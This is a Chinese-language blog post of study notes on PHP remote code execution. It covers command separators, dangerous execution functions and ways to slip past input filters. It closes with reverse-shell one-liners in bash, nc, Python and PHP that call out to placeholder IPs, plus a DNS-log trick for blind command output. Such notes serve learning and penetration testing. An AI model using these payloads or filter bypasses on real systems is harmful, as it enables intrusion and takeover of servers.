---
layout:     post                    # 使用的布局（不需要改）
title:      学习笔记-远程代码执行               # 标题 
subtitle:   对以前的笔记做整理的拓展
date:       2020-04-02             # 时间
author:     z0L1n                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - 基础
---

## 0x00远程代码执行-介绍：  
**远程代码执行**又叫**RCE**，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。
可能导致远程调用的方式来攻击计算机或者控制计算机，危害风险高。攻击者提交恶意构造语句提交时，便容易导致攻击成功。  

**简单的说：**  
> 应用程序有时需要调用执行系统命令的函数，例如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当这些函数中的参数可控时，就可以拼接恶意命令到正常命令中，达到攻击的目的。
一般在测试命令执行漏洞是经常使用的是一些不会危害对方系统以及涉及太多机密文件的命令，只要能够证实可以命令执行就好。     

在此类攻击中我们需要熟知linux和windows下的系统命令，和一些特性，下面简单说一下有关的命令连接符；    
windows系统    
|  ：直接执行后面的命令   
|| ：如果前面的语句执行出错，则执行后面的语句，前面的语句只能为假。   
&：如果前面的语句为假，则直接执行后面的语句。前面的语句可以为真为假。   
&&:如果前面的语句为假，则直接出错。   
linux：   
；：执行完前面的再执行后面的语句。   
|  ：直接执行后面的命令   
|| ：如果前面的语句执行出错，则执行后面的语句，前面的语句只能为假。   
&：如果前面的语句为假，则直接执行后面的语句。前面的语句可以为真为假。   
&&:如果前面的语句为假，则直接出错。   

## 常见的运用知识点！！！    
代码执行的几种常见方式：  
${}执行代码：${phpinfo()};  
eval:eval('phpinfo();');  
assert:<?php assert($_POST['a']);?> ,php7.0.29后不支持动态调用  
preg_replace：加上/e才会执行代码  
create_function():创建匿名函数来实现  
call_user_func()/call_user_func_array()：调用回调函数执行  
array_filter()：将数组中的值传入下一个参数，也就是传入callback函数。  

命令执行的几种常见方式：  
system()  
passthru()  
exec()  
shell_exec()  
`反引号  
ob_start()：打开输出缓冲，需要输出的内容都在内部缓冲区中，然后通过ob_end_fluch()输出。ob_start('system'),echo "ls",ob_end_flush()；即可完成攻击  
mail函数+LD_PRELOAD执行系统命令：首先LD_PRELOAD加载动态链接库（我们事先上传的重新定义了mail函数会调用的一个库函数的so文件），然后通过mail函数会调用标准库函数来完成命令执行。  

接下来总结一下rce中收集到的绕过姿势：  
- 空格（被过滤）：在bash下可以用以下字符代替空格：$IFS,${IFS},<,以及空参数%09这些  
- 命令分隔符：%0a，%0d，";"，&，|  
- 敏感字符绕过：  
①使用变量组合：$a=l;$b=s;$a$b   
②利用bash编码：转化为base64等  
③使用未定义的初始化变量放置在敏感词后面  
④使用连接符单引号  
⑤利用1>sh/1>ell.php这样的方式创建文件，然后利用ls -t>a,把内容存进a中再利用`sh a`这样的命令来执行，通常运用在有长度限制的过滤中使用  
⑥如果使用到网络地址，可以将网络地址转化为数字地址进行ip过滤  
⑦通配符？绕过，?a?在linux中可使用cat。  

对于无回显的命令执行，我们怎么才能知道呢？：  
①一句话反弹shell到自己的vps：|bash -i >& /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0>&1  
②利用ceye平台，使用curl访问的时候会记录在平台上面或者注册ceye.io后我们会有一个三级域名，ping `命令`.我们的域名，就可以在ceye平台上看到解析日志和命令回显。  

添加一些命令执行用到的一句话反弹shell：
```bash -i >& /dev/tcp/1.2.3.4/9527 0>&1```    
```nc -e /bin/sh 1.2.3.4 9527```    
```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```   
``` php -r '$sock=fsockopen("192.168.37.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```    
其中含有/bin/sh的命令，会涉及到标准输入、标准输出、标准错误输出的重定向。实际情况需要根据命令执行条件来getshell如果可以的话。
